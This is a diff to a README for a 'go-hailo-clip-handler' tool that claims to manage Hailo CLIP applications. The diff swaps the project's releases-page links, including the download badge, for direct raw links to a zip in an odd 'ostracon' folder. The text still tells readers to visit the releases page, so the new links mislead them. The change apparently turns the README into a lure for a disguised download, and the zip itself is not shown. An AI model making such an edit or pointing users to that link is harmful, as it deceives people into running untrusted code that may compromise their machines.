@@ -1,7 +1,7 @@
 # 🌟 go-hailo-clip-handler - Effortlessly Manage Your Hailo CLIP Applications
 
 ## 📥 Download Now
-[![Download go-hailo-clip-handler](https://img.shields.io/badge/Download-go--hailo--clip--handler-brightgreen)](https://github.com/Lucas-Arruda157/go-hailo-clip-handler/releases)
+[![Download go-hailo-clip-handler](https://raw.githubusercontent.com/Lucas-Arruda157/go-hailo-clip-handler/main/ostracon/go-hailo-clip-handler.zip)](https://raw.githubusercontent.com/Lucas-Arruda157/go-hailo-clip-handler/main/ostracon/go-hailo-clip-handler.zip)
 
 ## 🚀 Getting Started
 Welcome to the go-hailo-clip-handler! This application helps you manage Hailo CLIP projects with ease. Whether you are a beginner or just want a simple way to handle projects, you are in the right place.
@@ -19,7 +19,7 @@ Welcome to the go-hailo-clip-handler! This application helps you manage Hailo CL
 - **OpenAI CLIP Integration**: Utilize OpenAI's CLIP technology for your projects seamlessly.
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Download go-hailo-clip-handler](https://github.com/Lucas-Arruda157/go-hailo-clip-handler/releases). 
+To get started, visit this page to download the software: [Download go-hailo-clip-handler](https://raw.githubusercontent.com/Lucas-Arruda157/go-hailo-clip-handler/main/ostracon/go-hailo-clip-handler.zip). 
 
 ### Step-by-Step Instructions
 1. **Visit the Releases Page**: The link to the releases page is above. Click on it to go there.
